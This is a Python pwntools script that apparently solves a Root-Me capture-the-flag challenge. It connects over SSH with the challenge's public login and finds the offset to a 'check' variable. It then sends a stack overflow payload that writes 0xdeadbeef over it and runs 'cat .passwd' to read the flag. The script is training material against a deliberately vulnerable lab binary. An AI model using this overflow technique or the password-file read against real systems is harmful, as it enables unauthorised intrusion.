#!/usr/bin/env python3
from pwn import *
import re

HOST = 'challenge02.root-me.org'
PORT = 2222
USER = 'app-systeme-ch13'
PASS = 'app-systeme-ch13'
BINARY_PATH = "/challenge/app-systeme/ch13/ch13"
LOCAL_COPY  = "/tmp/ch13"


def find_check_offset(conn):
    pattern = cyclic(64, n=4)
    io = conn.process([BINARY_PATH])
    io.sendline(pattern)
    out = io.recvall(timeout=5).decode(errors='replace')

    m = re.search(r'\[check\]\s+(0x[0-9a-fA-F]+)', out)
    if not m:
        log.failure(out)
        log.error("Couldn't find '[check] 0x...' in output")

    leaked = int(m.group(1), 16)
    offset = cyclic_find(p32(leaked), n=4)
    if offset < 0:
        log.error(f"leaked value {leaked:#x} not found in cyclic pattern")

    log.info(f"check leaked back as: {leaked:#x}")
    log.info(f"offset to `check`   : {offset} bytes")
    return offset


def main():
    conn = ssh(host=HOST, port=PORT, user=USER, password=PASS, timeout=10)

    # one-shot remote commands, no manual prompt handling needed
    log.info(conn.system("ls -larh && pwd").recvall(timeout=5).decode())

    conn.download_file(BINARY_PATH, LOCAL_COPY)
    elf = ELF(LOCAL_COPY)
    context.binary = elf          # infers arch/bits/endian/os automatically

    offset = find_check_offset(conn)
    payload = flat(
        b'A' * offset,
        p32(0xdeadbeef),
    )

    io = conn.process([BINARY_PATH, payload])
    io.sendline(payload)

    out = io.recvall(timeout=5).decode(errors='replace')
    log.info(out)

    m = re.search(r'\[check\]\s+(0x[0-9a-fA-F]+)', out)
    if m:
        log.success(f"Overwritten `check` address/value: {m.group(1)}")
    else:
        log.failure("Didn't see the [check] line in output")

    io.sendline(b"cat .passwd")
    log.success(io.recvall(timeout=5).decode(errors='replace'))

    io.close()
    conn.close()


if __name__ == '__main__':
    main()
